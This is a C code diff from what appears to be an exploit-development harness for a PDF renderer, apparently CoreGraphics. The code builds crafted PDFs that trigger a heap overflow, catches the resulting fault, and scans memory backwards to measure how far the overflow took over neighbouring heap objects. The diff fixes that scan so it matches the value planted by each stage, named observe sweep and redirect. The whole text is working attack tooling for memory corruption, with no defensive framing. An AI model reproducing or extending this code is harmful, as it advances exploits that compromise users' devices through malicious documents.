@@ -286,6 +286,7 @@ enum { CGM_OFF = 0, CGM_OBSERVE = 1, CGM_MAP = 2, CGM_REDIR = 3 };
 
 #define CG_MAXPAGES   32
 #define CG_PAGE_SIZE  0x4000ULL
+#define CG_SWEEP_C0   0x3FF0000000000000ULL   // bits of double 1.0 (observe sweep)
 #define CG_REDIR_C0   0x430C6BF526340000ULL   // bits of double 1e15
 #define CG_CANARY     0xA5A5A5A5A5A5A5A5ULL
 #define CG_MAPFILL    0xCC
@@ -684,23 +685,27 @@ static int cg_safe_read(uintptr_t addr, void *dst, size_t n) {
 }
 
 // Walk backwards from the fault address through the runaway fill. Every word
-// matching the /C0 value is a slot the render wrote; the first word that does
-// not match is the start of whatever object sits before the overwritten block.
-// owned tells us how many bytes of the neighbouring region the render owned
-// before it ran off the end.
-static void cg_tail_scan(uintptr_t far) {
+// matching the value the PDF supplied is a slot the render wrote; the first word
+// that does not match is the start of whatever object sits before the overwritten
+// block. owned tells us how many bytes of the neighbouring region the render
+// owned before it ran off the end.
+//
+// The tag has to be the value that was actually in the PDF: the observe sweep
+// builds with 1.0 and the redirect stages build with 1e15, so a fixed constant
+// here silently reports owned=0 for one of them.
+static void cg_tail_scan(uintptr_t far, uint64_t tag) {
     if (!far) return;
     uint64_t w = 0;
     uintptr_t p = far;
     int owned = 0;
     while (owned < 65536) {
         if (p < 8 || cg_safe_read(p - 8, &w, 8) != 0) break;
-        if (w != CG_REDIR_C0) break;
+        if (w != tag) break;
         p -= 8;
         owned++;
     }
-    cg_logf("[CGT] tail far=0x%llx owned=%d bytes below the end",
-            (unsigned long long)far, owned * 8);
+    cg_logf("[CGT] tail far=0x%llx tag=0x%llx owned=%d bytes below the end",
+            (unsigned long long)far, (unsigned long long)tag, owned * 8);
     for (int i = 0; i < 4 && p >= 8; i++) {
         uint64_t b = 0;
         uintptr_t a = p - 8;
@@ -980,8 +985,8 @@ void cg_section(void (*logcb)(const char *)) {
 
         char err[128] = {0};
         size_t len = 0;
-        uint8_t *pdf = cg_build_pdf(&vars[i], 0x3FF0000000000000ULL,
-                                    0x3FF0000000000000ULL, NULL, &len, err, sizeof(err));
+        uint8_t *pdf = cg_build_pdf(&vars[i], CG_SWEEP_C0,
+                                     CG_SWEEP_C0, NULL, &len, err, sizeof(err));
         if (!pdf) { cg_logf("[CGV] %s build FAILED: %s", vars[i].name, err); continue; }
         if (cg_write_file(pdf, len, path) != 0) {
             cg_logf("[CGV] %s write FAILED", vars[i].name);
@@ -1004,7 +1009,7 @@ void cg_section(void (*logcb)(const char *)) {
         if (cg_hit > 0) {
             win = i;
             snprintf(winName, sizeof(winName), "%s", vars[i].name);
-            cg_tail_scan(cg_far);
+            cg_tail_scan(cg_far, CG_SWEEP_C0);
             // Stop the sweep on the first geometry that faults. Every further
             // render would re-enter a parser whose heap the previous one left
             // damaged, and each unwind strands more live CoreFoundation state.
@@ -1259,7 +1264,7 @@ void cg_tail_section(void (*logcb)(const char *)) {
 
         if (cg_hit > 0) {
             faulted++;
-            cg_tail_scan(cg_far);
+            cg_tail_scan(cg_far, CG_REDIR_C0);
             continue;
         }
 
